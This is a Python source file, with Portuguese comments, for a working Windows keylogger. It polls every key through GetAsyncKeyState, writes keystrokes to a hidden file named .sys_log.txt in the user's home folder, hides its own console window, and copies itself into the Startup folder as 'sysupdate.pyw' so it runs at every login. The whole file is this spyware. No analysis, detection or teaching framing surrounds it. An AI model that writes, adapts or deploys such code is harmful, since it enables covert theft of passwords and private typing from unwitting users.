import os
import sys
import time
import threading
import ctypes
from datetime import datetime

LOG_FILE = os.path.join(os.path.expanduser("~"), ".sys_log.txt")

# Mapeamento de teclas virtuais do Windows para caracteres
VK_MAP = {
    0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "[ENTER]",
    0x1B: "[ESC]", 0x20: " ", 0x25: "[LEFT]", 0x26: "[UP]",
    0x27: "[RIGHT]", 0x28: "[DOWN]", 0x2E: "[DELETE]",
    0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
    0x14: "[CAPS]", 0x5B: "[WIN]",
}
for i in range(0x30, 0x3A): VK_MAP[i] = chr(i)          # 0-9
for i in range(0x41, 0x5B): VK_MAP[i] = chr(i).lower()  # a-z
for i in range(0x60, 0x6A): VK_MAP[i] = str(i - 0x60)   # numpad

SHIFT_MAP = {
    '1':'!','2':'@','3':'#','4':'$','5':'%','6':'^','7':'&','8':'*','9':'(','0':')',
    '-':'_','=':'+','[':'{',']':'}','\\':'|',';':':',"'":'"',',':'<','.':'>','/':'?','`':'~'
}

def get_key(vk):
    if vk in VK_MAP:
        ch = VK_MAP[vk]
        if ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000 and ch in SHIFT_MAP:
            return SHIFT_MAP[ch]
        if ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000 and ch.isalpha():
            return ch.upper()
        return ch
    return None

def log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data)

def hook_loop():
    log(f"\n=== SESSION START {datetime.now()} ===\n")
    last = {}
    while True:
        for vk in range(0x08, 0xFF):
            state = ctypes.windll.user32.GetAsyncKeyState(vk)
            pressed = state & 0x8000
            if pressed and not last.get(vk):
                key = get_key(vk)
                if key:
                    log(key)
            last[vk] = pressed
        time.sleep(0.01)

def hide_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

def persist():
    try:
        startup = os.path.join(os.getenv("APPDATA"),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        me = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
        dst = os.path.join(startup, "sysupdate.pyw")
        if not os.path.exists(dst):
            with open(me, "rb") as s, open(dst, "wb") as d:
                d.write(s.read())
    except Exception:
        pass

if __name__ == "__main__":
    hide_console()
    persist()
    t = threading.Thread(target=hook_loop, daemon=True)
    t.start()
    t.join()